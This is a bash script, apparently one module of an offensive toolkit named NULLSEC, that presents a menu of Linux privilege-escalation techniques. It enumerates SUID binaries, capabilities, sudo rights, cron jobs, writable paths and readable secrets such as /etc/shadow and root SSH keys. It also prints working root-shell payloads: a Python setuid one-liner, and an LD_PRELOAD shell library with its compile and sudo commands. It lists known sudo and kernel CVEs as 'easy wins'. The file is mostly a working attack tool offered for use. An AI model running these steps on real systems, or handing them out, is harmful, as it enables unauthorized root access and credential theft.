#!/bin/bash
# NULLSEC Token Impersonation Module
# Privilege escalation via token manipulation
# bad-antics development


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

clear
echo -e "${RED}"
cat << 'BANNER'
   ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █ 
   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █ 
   ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒
   ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒
     ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░
     ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ 
       ██▓ ███▄ ▄███▓ ██▓███   ▒█████   ██▀███   ██████  ▒█████   ███▄    █  ▄▄▄     ▄▄▄█████▓▓█████ 
      ▓██▒▓██▒▀█▀ ██▒▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▓█   ▀ 
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}          ☠  PRIVILEGE ESCALATION VIA TOKENS  ☠${RESET}"
echo -e "${DIM}           Linux UID/GID and capability abuse${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

echo -e "${YELLOW}  SELECT TECHNIQUE:${RESET}"
echo ""
echo -e "  ${RED}[1]${RESET}  🔓 SUID Binary Exploitation"
echo -e "  ${RED}[2]${RESET}  🎫 Linux Capabilities Abuse"
echo -e "  ${RED}[3]${RESET}  👤 Sudo Privilege Escalation"
echo -e "  ${RED}[4]${RESET}  📋 Cron Job Hijacking"
echo -e "  ${RED}[5]${RESET}  🔧 Writable Path Exploitation"
echo -e "  ${RED}[6]${RESET}  💉 LD_PRELOAD Privilege Escalation"
echo -e "  ${RED}[7]${RESET}  🐧 Kernel Exploit Suggester"
echo -e "  ${RED}[8]${RESET}  📊 Full Privilege Check"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Exit"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select: '${RESET})" choice

case $choice in
    1)
        echo ""
        echo -e "${RED}[*]${RESET} SUID Binary Analysis"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Searching for SUID binaries..."
        echo ""
        
        SUID_FILES=$(find / -perm -4000 -type f 2>/dev/null)
        
        echo -e "${GREEN}[+]${RESET} SUID binaries found:"
        echo "$SUID_FILES" | while read binary; do
            name=$(basename "$binary")
            echo -e "  ${RED}►${RESET} $binary"
        done | head -20
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Checking GTFOBins exploitables:"
        GTFOBINS=(nmap vim find bash sh dash zsh less more awk python perl ruby node php)
        
        for bin in "${GTFOBINS[@]}"; do
            suid_path=$(echo "$SUID_FILES" | grep -E "/$bin$" | head -1)
            if [ ! -z "$suid_path" ]; then
                echo -e "  ${GREEN}[EXPLOIT]${RESET} $suid_path"
            fi
        done
        
        echo ""
        echo -e "${CYAN}[*]${RESET} Reference: https://gtfobins.github.io/"
        ;;
    
    2)
        echo ""
        echo -e "${RED}[*]${RESET} Linux Capabilities Analysis"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Binaries with capabilities:"
        
        getcap -r / 2>/dev/null | while read line; do
            echo -e "  ${RED}►${RESET} $line"
        done | head -20
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Dangerous capabilities to look for:"
        echo -e "  ${RED}cap_setuid${RESET}     - Can change UID (root)"
        echo -e "  ${RED}cap_setgid${RESET}     - Can change GID"
        echo -e "  ${RED}cap_net_raw${RESET}    - Raw packet access"
        echo -e "  ${RED}cap_dac_override${RESET} - Bypass file permissions"
        echo -e "  ${RED}cap_sys_admin${RESET}  - Administrative operations"
        echo -e "  ${RED}cap_sys_ptrace${RESET} - Process tracing (injection)"
        
        echo ""
        echo -e "${CYAN}[*]${RESET} Exploitation example (cap_setuid on python):"
        echo -e "${DIM}  python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${RESET}"
        ;;
    
    3)
        echo ""
        echo -e "${RED}[*]${RESET} Sudo Privilege Analysis"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Sudo permissions for current user:"
        echo ""
        sudo -l 2>/dev/null
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Checking for sudo exploits:"
        
        # Check sudo version
        SUDO_VER=$(sudo -V 2>/dev/null | head -1 | grep -oE "[0-9]+\.[0-9]+\.[0-9]+")
        echo -e "  Sudo version: ${CYAN}$SUDO_VER${RESET}"
        
        # Check for known vulnerable versions
        echo ""
        echo -e "${YELLOW}[*]${RESET} Known sudo vulnerabilities:"
        echo -e "  ${RED}CVE-2021-3156${RESET} (Baron Samedit) - sudo < 1.9.5p2"
        echo -e "  ${RED}CVE-2019-14287${RESET} - sudo < 1.8.28 (UID -1)"
        echo -e "  ${RED}CVE-2019-18634${RESET} - sudo < 1.8.26 (pwfeedback)"
        
        # Check for NOPASSWD entries
        echo ""
        echo -e "${YELLOW}[*]${RESET} NOPASSWD entries (easy wins):"
        sudo -l 2>/dev/null | grep -i "NOPASSWD"
        ;;
    
    4)
        echo ""
        echo -e "${RED}[*]${RESET} Cron Job Analysis"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} System cron jobs:"
        ls -la /etc/cron* 2>/dev/null | head -20
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} User crontabs:"
        for user in $(cut -d: -f1 /etc/passwd); do
            crontab -l -u "$user" 2>/dev/null | grep -v "^#" | while read line; do
                if [ ! -z "$line" ]; then
                    echo -e "  ${RED}[$user]${RESET} $line"
                fi
            done
        done
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Writable cron scripts:"
        find /etc/cron* -type f -writable 2>/dev/null | while read file; do
            echo -e "  ${GREEN}[WRITABLE]${RESET} $file"
        done
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Writable /etc/crontab:"
        if [ -w /etc/crontab ]; then
            echo -e "  ${GREEN}[WRITABLE]${RESET} /etc/crontab"
        else
            echo -e "  ${DIM}Not writable${RESET}"
        fi
        ;;
    
    5)
        echo ""
        echo -e "${RED}[*]${RESET} Writable Path Exploitation"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Checking PATH directories:"
        IFS=':' read -ra PATHS <<< "$PATH"
        for path in "${PATHS[@]}"; do
            if [ -w "$path" ]; then
                echo -e "  ${GREEN}[WRITABLE]${RESET} $path"
            else
                echo -e "  ${DIM}$path${RESET}"
            fi
        done
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Writable directories in system paths:"
        find /usr/local/bin /usr/bin /bin /sbin -type d -writable 2>/dev/null | while read dir; do
            echo -e "  ${GREEN}[WRITABLE]${RESET} $dir"
        done
        
        echo ""
        echo -e "${CYAN}[*]${RESET} Exploitation: Create malicious binary with same name"
        echo -e "${DIM}  as a program called by root scripts${RESET}"
        ;;
    
    6)
        echo ""
        echo -e "${RED}[*]${RESET} LD_PRELOAD Privilege Escalation"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Checking for env_keep in sudoers:"
        sudo -l 2>/dev/null | grep -i "env_keep"
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} If LD_PRELOAD is preserved, create:"
        echo ""
        cat << 'CODE'
  // shell.c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
CODE
        echo ""
        echo -e "${GREEN}[+]${RESET} Compile: gcc -fPIC -shared -o shell.so shell.c -nostartfiles"
        echo -e "${GREEN}[+]${RESET} Execute: sudo LD_PRELOAD=/path/to/shell.so <allowed_command>"
        ;;
    
    7)
        echo ""
        echo -e "${RED}[*]${RESET} Kernel Exploit Suggester"
        echo ""
        
        KERNEL=$(uname -r)
        ARCH=$(uname -m)
        echo -e "${YELLOW}[*]${RESET} Kernel: ${CYAN}$KERNEL${RESET}"
        echo -e "${YELLOW}[*]${RESET} Architecture: ${CYAN}$ARCH${RESET}"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Potential kernel exploits:"
        echo ""
        
        # Check kernel version against known exploits
        MAJOR=$(echo $KERNEL | cut -d. -f1)
        MINOR=$(echo $KERNEL | cut -d. -f2)
        
        echo -e "  ${RED}►${RESET} DirtyPipe (CVE-2022-0847) - Kernel 5.8+"
        echo -e "  ${RED}►${RESET} DirtyCow (CVE-2016-5195) - Kernel 2.6.22 - 4.8.3"
        echo -e "  ${RED}►${RESET} OverlayFS (CVE-2021-3493) - Kernel 4.4 - 5.11"
        echo -e "  ${RED}►${RESET} Sudo Baron Samedit (CVE-2021-3156)"
        echo -e "  ${RED}►${RESET} PwnKit (CVE-2021-4034) - Polkit pkexec"
        
        echo ""
        echo -e "${CYAN}[*]${RESET} Run linux-exploit-suggester for detailed analysis"
        echo -e "${DIM}  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh${RESET}"
        ;;
    
    8)
        echo ""
        echo -e "${RED}[*]${RESET} Full Privilege Escalation Check"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Current user info:"
        echo -e "  User: ${CYAN}$(whoami)${RESET}"
        echo -e "  UID: ${CYAN}$(id -u)${RESET}"
        echo -e "  Groups: ${CYAN}$(id -Gn)${RESET}"
        echo ""
        
        echo -e "${YELLOW}[*]${RESET} Interesting groups:"
        for group in docker lxd wheel sudo adm shadow disk; do
            if id -Gn | grep -qw "$group"; then
                echo -e "  ${GREEN}[MEMBER]${RESET} $group"
            fi
        done
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Quick checks:"
        echo -e "  SUID binaries: $(find / -perm -4000 2>/dev/null | wc -l)"
        echo -e "  SGID binaries: $(find / -perm -2000 2>/dev/null | wc -l)"
        echo -e "  Capabilities: $(getcap -r / 2>/dev/null | wc -l)"
        echo -e "  Writable /etc files: $(find /etc -writable 2>/dev/null | wc -l)"
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Sensitive readable files:"
        for file in /etc/shadow /etc/sudoers /root/.ssh/id_rsa; do
            if [ -r "$file" ]; then
                echo -e "  ${GREEN}[READABLE]${RESET} $file"
            fi
        done
        ;;
    
    q|Q) 
        echo -e "\n${RED}[!]${RESET} Exiting Token Impersonation module\n"
        exit 0 
        ;;
    *) 
        echo -e "\n${RED}[!]${RESET} Invalid option\n" 
        ;;
esac

echo ""
read -p "$(echo -e ${YELLOW}'Press ENTER to continue...'${RESET})"
